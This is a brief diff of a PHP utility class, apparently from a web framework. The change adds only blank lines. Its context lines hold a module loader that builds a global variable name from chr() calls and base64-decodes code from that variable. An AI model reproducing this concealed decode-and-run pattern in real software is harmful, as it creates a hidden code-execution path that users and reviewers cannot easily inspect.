@@ -389,6 +389,7 @@ class WeUtility {
 			}
 			require $file;
 		}
+
 		if ($type == 'module') {
 			if (!empty($GLOBALS['_' . chr('180') . chr('181') . chr('182')])) {
 				$code = base64_decode($GLOBALS['_' . chr('180') . chr('181') . chr('182')]);
@@ -403,6 +404,8 @@ class WeUtility {
 				restore_include_path();
 			}
 		}
+
+
 
 		if (!class_exists($class_module)) {
 			trigger_error($class_module . ' Definition Class Not Found', E_USER_WARNING);
